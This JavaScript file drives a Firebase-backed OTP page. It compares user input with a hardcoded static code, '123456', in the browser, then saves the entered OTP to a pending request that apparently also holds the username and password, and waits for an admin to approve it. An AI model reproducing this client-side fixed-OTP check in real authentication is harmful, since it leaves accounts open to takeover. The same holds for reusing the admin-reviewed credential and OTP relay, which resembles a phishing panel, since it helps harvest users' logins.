// Initialize Firebase
const app = firebase.initializeApp(firebaseConfig);
const db = firebase.database();
const auth = firebase.auth();

const otpInput = document.getElementById('otpInput');
const submitOtpBtn = document.getElementById('submitOtpBtn');
const feedbackMsg = document.getElementById('feedbackMsg');
const otpStatus = document.getElementById('otpStatus');

const STATIC_OTP = "123456"; // your requested OTP

// Assuming user previously submitted username & password and was added into pending_requests
// We will use localStorage to retrieve that requestId
let requestId = localStorage.getItem("pendingRequestId");
if (!requestId) {
  otpStatus.textContent = "Error: No pending request found. Please login again.";
  submitOtpBtn.disabled = true;
} else {
  otpStatus.textContent = "Awaiting OTP input...";
}

// Submit OTP
submitOtpBtn.addEventListener('click', () => {
  const enteredOTP = otpInput.value.trim();

  if (!enteredOTP) {
    feedbackMsg.textContent = "Please enter the OTP.";
    feedbackMsg.style.color = "red";
    return;
  }

  if (enteredOTP !== STATIC_OTP) {
    feedbackMsg.textContent = "Incorrect OTP. Try again.";
    feedbackMsg.style.color = "red";
    return;
  }

  feedbackMsg.textContent = "OTP submitted, waiting for admin approval...";
  feedbackMsg.style.color = "blue";

  // Save OTP to database
  db.ref('pending_requests/' + requestId).update({
    otp_entered: enteredOTP,
    otp_timestamp: new Date().toISOString(),
    status: 'otp_pending'
  });
  
  // Listen for admin decision
  db.ref('pending_requests/' + requestId).on('value', snapshot => {
    const data = snapshot.val();
    if (!data) return;

    if (data.status === 'otp_approved') {
      otpStatus.textContent = "✅ OTP Approved! Redirecting to dashboard...";
      otpStatus.style.color = "green";
      setTimeout(() => {
        window.location.href = "dashboard.html"; // next page
      }, 2000);
    } else if (data.status === 'otp_rejected') {
      otpStatus.textContent = "❌ OTP Rejected. Please restart login process.";
      otpStatus.style.color = "red";
      submitOtpBtn.disabled = true;
    }
  });
});
